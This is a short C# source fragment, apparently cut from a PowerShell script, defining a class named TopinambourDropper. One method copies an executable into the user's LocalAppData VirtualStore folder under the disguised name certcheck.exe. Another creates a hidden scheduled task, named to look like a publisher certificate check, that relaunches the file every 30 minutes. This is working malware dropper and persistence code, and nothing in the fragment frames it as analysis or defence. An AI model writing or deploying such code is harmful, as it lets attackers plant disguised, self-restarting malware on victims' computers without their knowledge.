using System;
using System.Diagnostics;
using System.IO;

public class TopinambourDropper {
    public static void unpack_p(string sourceExe) {
        string dropPath = Path.Combine(Environment.GetEnvironmentVariable("LOCALAPPDATA"), "VirtualStore", "certcheck.exe");
        Directory.CreateDirectory(Path.GetDirectoryName(dropPath));
        File.Copy(sourceExe, dropPath, true);
    }

    public static void make_some_noise() {
        ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c schtasks /create /SC MINUTE /MO 30 /TR \"%localappdata%\\VirtualStore\\certcheck.exe\" /TN VerifiedPublisherCertCheck /F")
        {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(startInfo).WaitForExit();
    }
}
'@
